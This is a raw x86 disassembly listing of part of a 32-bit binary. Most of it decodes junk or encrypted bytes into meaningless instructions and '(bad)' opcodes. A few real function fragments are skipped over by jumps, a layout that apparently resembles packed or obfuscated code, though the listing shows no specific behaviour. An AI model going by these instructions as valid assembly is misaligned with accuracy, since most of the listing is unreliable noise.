  4069b1:	mov    eax,ds:0x8953ac1c
  4069b6:	or     al,0x61
  4069b8:	sbb    ah,BYTE PTR [edi-0x78]
  4069bb:	(bad)  
  4069bc:	or     al,0xa5
  4069be:	xchg   edi,eax
  4069bf:	jecxz  0x4069f5
  4069c1:	sbb    ecx,0xffffffd6
  4069c4:	mov    ch,0xf2
  4069c6:	xchg   edx,eax
  4069c7:	ins    DWORD PTR es:[edi],dx
  4069c8:	mov    WORD PTR [esi+0x3cbc1ad2],?
  4069ce:	cmp    bl,BYTE PTR [di+0x77]
  4069d2:	push   0x5c0bc8bc
  4069d7:	mov    cl,0xdd
  4069d9:	add    eax,DWORD PTR [esi-0x7e]
  4069dc:	fdiv   QWORD PTR [edx+0x60bc4c12]
  4069e2:	loopne 0x4069d2
  4069e4:	shl    BYTE PTR [edx+0x4deb2dbe],1
  4069ea:	je     0x406a50
  4069ec:	push   ebx
  4069ed:	sub    esi,DWORD PTR ds:0xdd82a82d
  4069f3:	mov    ah,0xba
  4069f5:	xor    cl,BYTE PTR [edx+0x368b5589]
  4069fb:	in     eax,dx
  4069fc:	rcl    BYTE PTR [esi-0x66d705b9],0x94
  406a03:	addr16 pop esp
  406a05:	or     al,0x26
  406a07:	mov    ebp,0xf2191eb9
  406a0c:	mov    dh,0x1c
  406a0e:	cld    
  406a0f:	sbb    DWORD PTR [edi+ebp*4+0x30],ebx
  406a13:	pop    es
  406a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a15:	dec    edi
  406a16:	or     eax,0xe844feb9
  406a1b:	xchg   edx,eax
  406a1c:	cmp    DWORD PTR [edi],edi
  406a1e:	(bad)  
  406a1f:	push   ebx
  406a20:	js     0x406a35
  406a22:	inc    edi
  406a23:	jnp    0x406a34
  406a25:	sbb    BYTE PTR [ebx-0x6d],ch
  406a28:	lods   al,BYTE PTR ds:[esi]
  406a29:	inc    esp
  406a2a:	call   0x84152b09
  406a2f:	retf   0x2508
  406a32:	test   DWORD PTR [esi+0x44227ef1],edi
  406a38:	add    edi,DWORD PTR [ebx]
  406a3a:	jecxz  0x406a31
  406a3c:	inc    ebx
  406a3d:	cmc    
  406a3e:	fmul   QWORD PTR [esi-0x14b40df6]
  406a44:	aaa    
  406a45:	daa    
  406a46:	or     al,0xbb
  406a48:	and    dl,BYTE PTR [eax+0x12]
  406a4b:	loop   0x406a2a
  406a4d:	daa    
  406a4e:	push   DWORD PTR [edi-0x80]
  406a51:	push   edi
  406a52:	imul   esp,DWORD PTR [edx-0x59],0x12d8ea24
  406a59:	or     bh,BYTE PTR [ecx]
  406a5b:	pxor   mm6,QWORD PTR [esi-0x60]
  406a5f:	mov    BYTE PTR [ecx],cl
  406a61:	mov    cs,WORD PTR [edx-0x5aa8c0c8]
  406a67:	push   ebp
  406a68:	test   BYTE PTR [ecx+0x719fa68],ch
  406a6e:	out    0xb0,eax
  406a70:	cmp    BYTE PTR [edi+0x74],0xce
  406a74:	lods   al,BYTE PTR ds:[esi]
  406a75:	and    ch,BYTE PTR [eax+0x64abf28d]
  406a7b:	xchg   esi,eax
  406a7c:	montmul (bad)
  406a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a7e:	add    al,0x7d
  406a80:	or     eax,0x3366e46a
  406a85:	sar    DWORD PTR [ecx+0x3b00],0x66
  406a8c:	add    eax,ecx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x65d2:0xd9dda5c
  406abc:	or     BYTE PTR [edi],al
  406abe:	pusha  
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	sub    al,0x45
  406ac8:	jne    0x406abd
  406aca:	mov    ds:0xba5b1379,eax
  406acf:	xor    BYTE PTR [ebx+0x2f],0x7
  406ad3:	retf   0xedc9
  406ad6:	fcmovbe st,st(7)
  406ad8:	ret    
  406ad9:	fs jb  0x406ac9
  406adc:	jle    0x406a89
  406ade:	iret   
  406adf:	in     al,0x29
  406ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ae2:	mov    dh,0x3d
  406ae4:	pop    ecx
  406ae5:	jo     0x406b10
  406ae7:	xchg   ebp,eax
  406ae8:	jmp    0xebcc458b
  406aed:	push   esp
  406aee:	clc    
  406aef:	ficomp WORD PTR [edx]
  406af1:	test   al,0xc
  406af3:	mov    al,0xd2
  406af5:	mov    ebx,0xc4801e05
  406afa:	mov    bl,0x50
  406afc:	repnz (bad) 
  406aff:	loopne 0x406af2
  406b01:	stos   BYTE PTR es:[edi],al
  406b02:	call   0xb651c7d3
  406b07:	mov    edx,0x74ae3672
  406b0c:	xchg   esi,eax
  406b0d:	jmp    0x406b41
  406b0f:	es popf 
  406b11:	cmp    BYTE PTR [ebx],dh
  406b13:	mov    ebp,eax
  406b15:	xor    BYTE PTR [edx+0x5d],ah
  406b18:	sbb    esp,DWORD PTR ds:0x93e867eb
  406b1e:	(bad)  
  406b1f:	scas   al,BYTE PTR es:[edi]
  406b20:	ret    0x220
  406b23:	rol    bl,0x64
  406b26:	nop
  406b27:	sub    ch,BYTE PTR [ebp+0x54]
  406b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b2b:	sar    ecx,0xc5
  406b2e:	mov    edi,0xa01e8873
  406b33:	cs add al,0x34
  406b36:	int3   
  406b37:	in     al,0x1
  406b39:	mov    cs,WORD PTR [edi+0x48]
  406b3c:	fprem1 
  406b3e:	jb     0x406bad
  406b40:	mov    edi,0x1161b16d
  406b45:	fist   DWORD PTR [ecx+0x6f9ebfad]
  406b4b:	repz imul esi,DWORD PTR [eax+0x4538d0b2],0xffffff96
  406b53:	addr16 xchg edi,eax
  406b55:	and    al,0x93
  406b57:	fwait
  406b58:	jecxz  0x406b57
  406b5a:	aad    0x7
  406b5c:	fisttp DWORD PTR [edi]
  406b5e:	not    DWORD PTR [edi+edi*2+0x74944727]
  406b65:	sbb    bl,dh
  406b67:	test   eax,0x6300ee4
  406b6c:	dec    eax
  406b6d:	cmc    
  406b6e:	dec    eax
  406b6f:	call   0xa1f6e3ce
  406b74:	stc    
  406b75:	sub    al,0x6e
  406b77:	dec    esp
  406b78:	cli    
  406b79:	(bad)  
  406b7a:	mov    ebp,0xb599b63d
  406b7f:	dec    ebx
  406b80:	fistp  DWORD PTR [eax-0xa2c45eb]
  406b86:	adc    al,0xb7
  406b88:	adc    esi,ecx
  406b8a:	dec    eax
  406b8c:	inc    edi
  406b8d:	mov    ecx,0x82dfd84c
  406b92:	ret    0xedfb
  406b95:	loopne 0x406baa
  406b97:	fisub  WORD PTR [eax+0x4c1f177]
  406b9d:	outs   dx,BYTE PTR ds:[esi]
  406b9e:	inc    edx
  406b9f:	das    
  406ba0:	sub    DWORD PTR [eax],eax
  406ba2:	adc    al,0xe7
  406ba4:	cwde   
  406ba5:	xchg   BYTE PTR [edi+edi*2-0x5d82209b],cl
  406bac:	jno    0x406bfc
  406bae:	stc    
  406baf:	pop    ecx
  406bb0:	adc    al,0x7b
  406bb2:	outs   dx,DWORD PTR ds:[esi]
  406bb3:	jp     0x406b53
  406bb5:	push   0x79b995f7
  406bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bbb:	enter  0x8dd9,0xbb
  406bbf:	mov    DWORD PTR [edx-0x7f309dae],edi
  406bc5:	jmp    0xa99e:0xbbbf6f7e
  406bcc:	pop    es
  406bcd:	pop    eax
  406bce:	cmp    al,0xaf
  406bd0:	fsubrp st(3),st
  406bd2:	adc    al,0xb0
  406bd4:	xor    DWORD PTR [esi-0x49bdd13a],edi
  406bda:	sub    al,0x83
  406bdc:	adc    al,0xb7
  406bde:	push   esp
  406bdf:	mov    ebx,0xad2d89ca
  406be4:	mov    cl,0x88
  406be6:	sub    BYTE PTR ds:0x9cc04949,0x2f
  406bed:	cmp    eax,0xca4b7b7b
  406bf2:	aad    0x41
  406bf4:	xor    eax,0x6792a18a
  406bf9:	les    ebx,FWORD PTR [ebp-0x68eeec73]
  406bff:	mov    ds:0xb6148ceb,eax
  406c04:	aad    0xec
  406c06:	lods   eax,DWORD PTR ds:[esi]
  406c07:	add    ebx,0x25
  406c0a:	in     al,0xb5
  406c0c:	adc    DWORD PTR cs:[ebx-0x2],0x23411a1
  406c14:	mov    ebx,DWORD PTR [ecx]
  406c16:	adc    bl,BYTE PTR [eax]
  406c18:	mov    cl,0x17
  406c1a:	in     al,0xde
  406c1c:	xor    BYTE PTR [esi-0x2],bh
  406c1f:	test   DWORD PTR [esi],esi
  406c21:	jb     0x406c2f
  406c23:	sub    ch,BYTE PTR [edi-0x24580933]
  406c29:	pop    eax
  406c2a:	and    BYTE PTR [ecx+0x1b],dh
  406c2d:	cmp    al,0xa7
  406c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c30:	inc    ebp
  406c31:	and    esi,0x2
  406c34:	push   ss
  406c35:	rcr    BYTE PTR [eax],0xbf
  406c38:	sub    al,0x99
  406c3a:	sub    esi,DWORD PTR [ebx+0x36f6a8a7]
  406c40:	cmp    cl,BYTE PTR [eax+0x68]
  406c43:	xchg   ebp,eax
  406c44:	adc    al,0x68
  406c46:	adc    BYTE PTR [esi+0x1e],bl
  406c49:	push   ecx
  406c4a:	outs   dx,DWORD PTR ds:[esi]
  406c4b:	adc    BYTE PTR [ebp+0x52],ah
  406c4e:	adc    DWORD PTR [ebp+0xd1a79c4],0x4c
  406c55:	retf   
  406c56:	fnstenv [edx]
  406c58:	stc    
  406c59:	inc    ecx
  406c5a:	dec    eax
  406c5b:	mov    eax,0x6f390863
  406c60:	cdq    
  406c61:	sbb    bl,BYTE PTR [ecx-0x5dfcd00]
  406c67:	retf   0x470c
  406c6a:	js     0x406cc1
  406c6c:	jno    0x31c2baa5
  406c72:	inc    esp
  406c73:	cs enter 0x2e56,0x59
  406c78:	push   eax
  406c79:	add    ch,BYTE PTR [ecx-0x7]
  406c7c:	xor    al,BYTE PTR [ebp-0x4b30b13e]
  406c82:	mov    eax,ds:0x31bebb12
  406c87:	inc    ecx
  406c88:	scas   al,BYTE PTR es:[edi]
  406c89:	inc    edx
  406c8a:	in     al,dx
  406c8b:	sbb    edx,eax
  406c8d:	scas   eax,DWORD PTR es:[edi]
  406c8e:	cmp    BYTE PTR [edx+edx*4+0x20],0x46
  406c93:	pop    eax
  406c94:	stc    
  406c95:	pusha  
  406c96:	inc    esi
  406c97:	loopne 0x406ca6
  406c99:	popa   
  406c9a:	dec    ecx
  406c9b:	jmp    0xde2f51a7
  406ca0:	mov    cl,bl
  406ca2:	loope  0x406c27
  406ca4:	dec    eax
  406ca5:	ret    
  406ca6:	mov    dh,0x34
  406ca8:	ror    edi,1
  406caa:	and    al,0xc5
  406cac:	pop    ds
  406cad:	sbb    bh,dl
  406caf:	lds    edx,FWORD PTR [edx]
  406cb1:	pop    ecx
  406cb2:	ficom  WORD PTR [ebx]
  406cb4:	mov    DWORD PTR ds:0xf66a70de,eax
  406cba:	or     cl,BYTE PTR [ebx+edi*1-0x3c]
  406cbe:	adc    bh,BYTE PTR [eax-0x4a6ed9be]
  406cc4:	xor    edx,DWORD PTR [edx]
  406cc6:	mov    edx,0x461f9d77
  406ccb:	pop    ecx
  406ccc:	leave  
  406ccd:	fcom   DWORD PTR [ecx-0x47a4fdb6]
  406cd3:	mov    edi,0x827fe64a
  406cd8:	repz out 0x32,al
  406cdb:	sub    ecx,edx
  406cdd:	sbb    ebx,edi
  406cdf:	ud1    esi,DWORD PTR ds:0x866d5b54
  406ce6:	sbb    BYTE PTR [ebx+0x3bfb36b8],dl
  406cec:	mov    ah,0xa6
  406cee:	int    0xe2
  406cf0:	xchg   esi,eax
  406cf1:	mov    ecx,0xe56c5a79
  406cf6:	icebp  
  406cf7:	mov    edx,0x3d0d817
  406cfc:	out    0x13,eax
  406cfe:	fidivr WORD PTR [edi+0x40]
  406d01:	cmp    esp,DWORD PTR [esi-0x75]
  406d04:	inc    ebp
  406d05:	clc    
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4335ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43361b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43359b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433543
  406d52:	or     DWORD PTR ds:0x43359f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433557,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43361b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    dh,BYTE PTR ss:[ecx+0x24c70385]
  406d85:	ret    0x7c7c
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d31
  406d8d:	mov    ds:0x900878f1,al
  406d92:	pop    edi
  406d93:	mov    dh,0x3d
  406d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d96:	cmp    DWORD PTR [edx],0x64
  406d99:	pop    esi
  406d9a:	xchg   esp,eax
  406d9b:	jne    0x406dec
  406d9d:	mov    eax,0xe6bca8e8
  406da2:	pusha  
  406da3:	and    DWORD PTR [ebp+0x7402f9f5],edi
  406da9:	jle    0x406d82
  406dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dac:	stos   BYTE PTR es:[edi],al
  406dad:	shr    DWORD PTR [ebp-0x35],1
  406db0:	enter  0xf96f,0xe5
  406db4:	fsubr  DWORD PTR ds:[ebx-0x712aba4e]
  406dbb:	and    ah,BYTE PTR [edi+0x3e]
  406dbe:	pusha  
  406dbf:	add    ch,bl
  406dc1:	fadd   DWORD PTR [ebx-0x3f]
  406dc4:	arpl   bp,bx
  406dc6:	mov    al,ds:0xc35bc620
  406dcb:	into   
  406dcc:	fild   WORD PTR [ebx]
  406dce:	(bad)  
  406dcf:	aas    
  406dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dd1:	imul   ebx,DWORD PTR [esi+eiz*8],0xfffffffa
  406dd5:	inc    edx
  406dd6:	xchg   edi,ebp
  406dd8:	mov    BYTE PTR [eax-0x43a51bc6],ah
  406dde:	lea    ebp,[esi+ebx*2+0x63]
  406de2:	sub    eax,0xc0075fa4
  406de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406de8:	scas   eax,DWORD PTR es:[edi]
  406de9:	xchg   ebp,eax
  406dea:	mov    dl,BYTE PTR [ecx+0x3ae8b0a7]
  406df0:	sahf   
  406df1:	cmc    
  406df2:	test   eax,0xcb7cd031
  406df7:	mov    ecx,0x5dfcdecf
  406dfc:	test   eax,0x4a6baaa4
  406e01:	sahf   
  406e02:	gs cdq 
  406e04:	aad    0xb8
  406e06:	mov    ah,dl
  406e08:	ds xchg esp,eax
  406e0a:	fld    TBYTE PTR [ebp+0x2d893295]
  406e10:	mov    ch,0xee
  406e12:	sub    DWORD PTR [esi+0x49cee5bc],ecx
  406e18:	push   0xffffffe9
  406e1a:	lods   al,BYTE PTR ds:[esi]
  406e1b:	loope  0x406db5
  406e1d:	out    dx,al
  406e1e:	inc    ebx
  406e1f:	and    DWORD PTR [edi+0x4d],eax
  406e22:	cmc    
  406e23:	xor    bl,dl
  406e25:	idiv   edi
  406e27:	(bad)  
  406e28:	mov    ecx,0x65593a13
  406e2d:	jg     0x406eaa
  406e2f:	out    dx,al
  406e30:	repz sbb BYTE PTR ds:[esi-0x5b],0xf9
  406e36:	cdq    
  406e37:	pop    eax
  406e38:	jmp    0x7eb6720a
  406e3d:	dec    ebp
  406e3e:	sbb    eax,0xc3489192
  406e43:	fcomip st,st(1)
  406e45:	aas    
  406e46:	and    eax,0xeb2db6b5
  406e4b:	das    
  406e4c:	push   ebp
  406e4d:	(bad)  
  406e4e:	xchg   ebx,eax
  406e4f:	push   ebp
  406e50:	inc    ebx
  406e51:	ss repz push edi
  406e54:	retf   
  406e55:	adc    ah,bl
  406e57:	dec    eax
  406e58:	jnp    0x406e5b
  406e5a:	xlat   BYTE PTR ds:[ebx]
  406e5b:	shl    BYTE PTR [ebp-0x29],cl
  406e5e:	hlt    
  406e5f:	xchg   ebp,eax
  406e60:	sub    ch,BYTE PTR [esi-0x48]
  406e63:	add    edi,DWORD PTR [edi-0x6f]
  406e66:	cmp    al,0x8d
  406e68:	mov    cl,0xc7
  406e6a:	(bad)  
  406e6b:	cmp    BYTE PTR [ecx+0x354c76a6],dh
  406e71:	jge    0x406ed8
  406e73:	repnz sbb edi,DWORD PTR es:[edi-0x7dc52fe7]
  406e7b:	(bad)  
  406e7c:	aad    0xc0
  406e7e:	mov    ebx,0xc5990740
  406e83:	and    BYTE PTR [ebp-0x2b0430b0],0xf5
  406e8a:	mov    dl,0x79
  406e8c:	sbb    dl,bh
  406e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e8f:	add    DWORD PTR [eax+0xb],ebx
  406e92:	stc    
  406e93:	loopne 0x406ee7
  406e95:	ror    DWORD PTR [ecx+ecx*1],0x55
  406e99:	stos   DWORD PTR es:[edi],eax
  406e9a:	xchg   edi,eax
  406e9b:	mov    ecx,0xe6a63797
  406ea0:	(bad)  
  406ea1:	hlt    
  406ea2:	stc    
  406ea3:	and    ebp,DWORD PTR [eax+ebp*8+0x6f]
  406ea7:	call   0xa841c83e
  406eac:	in     al,dx
  406ead:	(bad)  
  406eae:	adc    eax,0xf68f2ca0
  406eb3:	push   esi
  406eb4:	adc    DWORD PTR [ebx],ebx
  406eb6:	popa   
  406eb7:	mov    ah,dl
  406eb9:	je     0x406e45
  406ebb:	push   ss
  406ebc:	lds    edx,FWORD PTR ds:0xb9c6ddea
  406ec2:	repnz or DWORD PTR [ebx],edi
  406ec5:	mov    al,0xaf
  406ec7:	fld    TBYTE PTR [esi-0x34cd1cc3]
  406ecd:	or     DWORD PTR [esi+0x2f],0x9d5968b1
  406ed4:	(bad)  
  406ed6:	out    dx,al
  406ed7:	ficom  WORD PTR [esi+0x64db6ae3]
  406edd:	gs loop 0x406e98
  406ee0:	mov    ah,0xf9
  406ee2:	lods   eax,DWORD PTR ds:[esi]
  406ee3:	adc    al,BYTE PTR [esi-0x34]
  406ee6:	push   ebx
  406ee7:	jecxz  0x406ee9
  406ee9:	xchg   ebx,eax
  406eea:	inc    edx
  406eeb:	jl     0x406f57
  406eed:	ds (bad) 
  406eef:	sti    
  406ef0:	jne    0x406eef
  406ef2:	mov    edi,0xea19c91b
  406ef7:	mov    al,0xae
  406ef9:	les    edi,FWORD PTR [ebp-0x69]
  406efc:	mov    ds:0x66424bcd,eax
  406f01:	push   eax
  406f02:	add    DWORD PTR [edx+ebp*4+0x65aa3002],edx
  406f09:	add    BYTE PTR [ecx-0x6c5a3f30],0xf3
  406f10:	push   0xcfbd27be
  406f15:	add    eax,0x4ed13c21
  406f1a:	cmp    DWORD PTR [edx],0xffffff8f
  406f1d:	adc    al,0x18
  406f1f:	arpl   bp,dx
  406f21:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f23:	jae    0x406fa3
  406f25:	jbe    0x406f0c
  406f27:	jb     0x406f64
  406f29:	xchg   edi,eax
  406f2a:	sbb    BYTE PTR [eax-0x40d5f063],0x9f
  406f31:	fs pop ecx
  406f33:	pop    ds
  406f34:	jns    0x406f0b
  406f36:	loopne 0x406f73
  406f38:	enter  0x3adf,0xec
  406f3c:	xor    al,0x55
  406f3e:	sbb    eax,0xb5775f19
  406f43:	xor    esi,DWORD PTR [eax-0x63]
  406f46:	push   esp
  406f47:	jmp    0x5cd8cf68
  406f4c:	push   ss
  406f4d:	or     BYTE PTR [ebp+0x29d5ef00],cl
  406f53:	and    al,0xa1
  406f55:	cmp    bl,BYTE PTR [ebp-0x481221e2]
  406f5b:	lahf   
  406f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f5d:	jecxz  0x406fae
  406f5f:	dec    edx
  406f60:	ret    0x9174
  406f63:	inc    ebx
  406f64:	jne    0x406f69
  406f66:	xor    al,0xd4
  406f68:	xor    al,0x22
  406f6a:	rcr    BYTE PTR [eax+0x10],1
  406f6d:	mov    ds:0xf49b7821,al
  406f72:	cdq    
  406f73:	cs cmp al,0x7c
  406f76:	dec    esp
  406f77:	div    ch
  406f79:	push   eax
  406f7a:	add    DWORD PTR [edx],0xb51d01ed
  406f80:	stc    
  406f81:	dec    esi
  406f82:	push   0x6e
  406f84:	push   0xffffffc0
  406f86:	pop    esi
  406f87:	mov    bl,0x42
  406f89:	xchg   esi,eax
  406f8a:	int3   
  406f8b:	hlt    
  406f8c:	or     eax,0x75e22103
  406f91:	sbb    DWORD PTR [edi-0x29e5e701],ecx
  406f97:	retf   
  406f98:	int3   
  406f99:	test   DWORD PTR [edi],esp
  406f9b:	shl    BYTE PTR [edi],cl
  406f9d:	cmc    
  406f9e:	sahf   
  406f9f:	sub    DWORD PTR ds:0x64c9593f,0xffffffaa
  406fa6:	adc    ecx,edi
  406fa8:	push   esi
  406fa9:	fs js  0x406fc4
  406fac:	push   esi
  406fad:	(bad)  
  406fae:	jbe    0x406f88
  406fb0:	xchg   BYTE PTR [esi],al
  406fb2:	repnz push esi
  406fb4:	sub    ah,dl
  406fb6:	(bad)  
  406fb7:	out    0xee,al
  406fb9:	test   DWORD PTR [ecx+0x6d],ebp
  406fbc:	inc    esp
  406fbd:	and    DWORD PTR [ebx],esi
  406fbf:	cmp    edi,edx
  406fc1:	dec    ecx
  406fc2:	pop    esp
  406fc3:	stos   BYTE PTR es:[edi],al
  406fc4:	leave  
  406fc5:	xlat   BYTE PTR ds:[ebx]
  406fc6:	sar    DWORD PTR [ebx+0x45],cl
  406fc9:	sub    BYTE PTR [ebx-0x19397e0],dl
  406fcf:	fld    TBYTE PTR [edx]
  406fd1:	mov    ebp,0x52b5db90
  406fd6:	or     BYTE PTR [eax+0x1fe73ac9],ah
  406fdc:	sub    bl,BYTE PTR [edx+edi*4]
  406fdf:	ins    DWORD PTR es:[edi],dx
  406fe0:	shl    BYTE PTR [edi+0x53c9588d],cl
  406fe6:	push   esi
  406fe7:	jns    0x407005
  406fe9:	imul   ecx,DWORD PTR [edi],0xec12dc49
  406fef:	cdq    
  406ff0:	mov    edi,0xda73465e
  406ff5:	mov    bl,0xe2
  406ff7:	xchg   edx,eax
  406ff8:	xlat   BYTE PTR ds:[ebx]
  406ff9:	mov    bl,0xdb
  406ffb:	out    0xe8,eax
  406ffd:	mov    ds:0x257e4b89,eax
  407002:	jge    0x406fb8
  407004:	add    DWORD PTR [edi-0x44],esi
  407007:	dec    ecx
  407008:	(bad)  
  407009:	mov    dl,0x73
  40700b:	mov    bl,0x6e
  40700d:	jo     0x40702b
  40700f:	pop    esi
  407010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407011:	push   es
  407012:	lds    ecx,FWORD PTR [edi+eiz*1+0x3]
  407016:	mov    ecx,0xa31ddd7d
  40701b:	out    0x74,eax
  40701d:	xchg   ebp,eax
  40701e:	sub    DWORD PTR [edi+0x3728d158],eax
  407024:	mov    es,WORD PTR [eax]
  407026:	aam    0xd6
  407028:	sbb    BYTE PTR [ecx-0xe],al
  40702b:	xchg   ebp,eax
  40702c:	je     0x407095
  40702e:	jno    0x407055
  407030:	pop    eax
  407031:	cmp    eax,0xe5f6a399
  407036:	dec    esi
  407037:	add    DWORD PTR [esi+0x521f5b96],edx
  40703d:	loop   0x4070af
  40703f:	ins    BYTE PTR es:[edi],dx
  407040:	(bad)
  407044:	push   edi
  407045:	add    DWORD PTR [edi+esi*8],0x7b
  407049:	(bad)  
  40704a:	jmp    FWORD PTR [esi-0x7c]
  40704d:	lods   eax,DWORD PTR ds:[esi]
  40704e:	inc    ebp
  40704f:	jne    0x407092
  407051:	in     eax,dx
  407052:	xlat   BYTE PTR ds:[ebx]
  407053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407054:	adc    bl,dl
  407056:	add    eax,edx
  407058:	retf   0xb10
  40705b:	pop    edi
  40705c:	xchg   ebx,eax
  40705d:	push   es
  40705e:	(bad)  
  40705f:	xchg   ebp,eax
  407060:	jecxz  0x407095
  407062:	mov    ds:0xfb091904,al
  407067:	sub    bl,dh
  407069:	scas   al,BYTE PTR es:[edi]
  40706a:	(bad)  
  40706c:	ins    BYTE PTR es:[edi],dx
  40706d:	sbb    ah,BYTE PTR [esi+0x50]
  407070:	jecxz  0x406ffd
  407072:	or     DWORD PTR [ebx-0x5c],esi
  407075:	lods   al,BYTE PTR ds:[esi]
  407076:	and    DWORD PTR [ecx-0x2353a5ae],esp
  40707c:	fisubr DWORD PTR [edx]
  40707e:	jg     0x407036
  407080:	idiv   al
  407082:	ins    BYTE PTR es:[edi],dx
  407083:	and    al,0x29
  407085:	add    DWORD PTR [ecx],eax
  407087:	ins    DWORD PTR es:[edi],dx
  407088:	cmp    BYTE PTR [esi+ebx*2+0x34],dl
  40708c:	xchg   ebx,eax
  40708d:	cmp    al,0xa8
  40708f:	push   di
  407091:	mov    bh,BYTE PTR [esi+0x32b5d3e4]
  407097:	loop   0x4070e6
  407099:	cmp    bh,ah
  40709b:	popf   
  40709c:	add    DWORD PTR [ebp-0xdfeb468],edi
  4070a2:	jo     0x407057
  4070a4:	push   edi
  4070a5:	in     eax,dx
  4070a6:	std    
  4070a7:	lds    ebx,FWORD PTR [esi+0x27]
  4070aa:	pop    es
  4070ab:	sub    DWORD PTR [esi],esi
  4070ad:	xchg   esp,eax
  4070ae:	jp     0x40711a
  4070b0:	xor    bh,bl
  4070b2:	test   DWORD PTR [edi+0x7e],edx
  4070b5:	sahf   
  4070b6:	xchg   BYTE PTR [eax+0x2e94567d],dl
  4070bc:	push   es
  4070bd:	aaa    
  4070be:	xchg   BYTE PTR [eax-0x64],dh
  4070c1:	xor    esp,esi
  4070c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070c4:	in     eax,dx
  4070c5:	mov    ebx,0x8855f456
  4070ca:	push   ecx
  4070cb:	push   ebx
  4070cc:	or     eax,0xff00a30a
  4070d1:	mov    esi,0x95183eff
  4070d6:	loopne 0x407060
  4070d8:	adc    eax,0xb70f395b
  4070dd:	jge    0x40710f
  4070df:	mov    WORD PTR [esi+edx*4],?
  4070e2:	pop    ebx
  4070e3:	repnz lds ecx,FWORD PTR [ecx+0x2581d845]
  4070ea:	dec    edi
  4070eb:	xor    eax,0x274d0043
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4335f3
  407100:	add    ecx,DWORD PTR ds:0x433543
  407106:	mov    DWORD PTR ds:0x4335f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	(bad)  
  40711d:	sti    
  40711e:	dec    ebx
  40711f:	sar    DWORD PTR [edi+edi*8-0x31],0x7c
  407124:	jl     0x4070fd
  407126:	jns    0x4071a4
  407128:	jl     0x407139
  40712a:	sub    eax,0xd604ab73
  40712f:	lahf   
  407130:	dec    ecx
  407131:	fimul  DWORD PTR ds:0xa00dc154
  407137:	fwait
  407138:	js     0x407183
  40713a:	dec    eax
  40713b:	std    
  40713c:	(bad)
  40713f:	or     cl,BYTE PTR [ebp-0x6238f010]
  407145:	cs pushf 
  407147:	pop    esp
  407148:	ror    DWORD PTR [esi-0x650a71aa],0xc9
  40714f:	fmul   DWORD PTR [ecx-0x4c8a38ed]
  407155:	rol    DWORD PTR [edi+0x5bbdc36f],1
  40715b:	jne    0x40718e
  40715d:	xchg   ebp,eax
  40715e:	pop    ss
  40715f:	les    esi,FWORD PTR [eax-0x1c1b06b2]
  407165:	aas    
  407166:	mov    DWORD PTR [eax-0x17],edi
  407169:	ret    
  40716a:	inc    esp
  40716b:	mov    eax,0xfef437dd
  407170:	(bad)  
  407171:	sub    ebx,eax
  407173:	mov    ch,0x0
  407175:	xchg   esi,eax
  407176:	in     al,dx
  407177:	sar    BYTE PTR [ecx+edi*1],1
  40717a:	push   esi
  40717b:	rol    dl,0x58
  40717e:	scas   al,BYTE PTR es:[edi]
  40717f:	daa    
  407180:	aad    0xa3
  407182:	inc    edi
  407183:	ins    DWORD PTR es:[edi],dx
  407184:	fisub  WORD PTR [ebx-0x27]
  407187:	and    al,0x20
  407189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
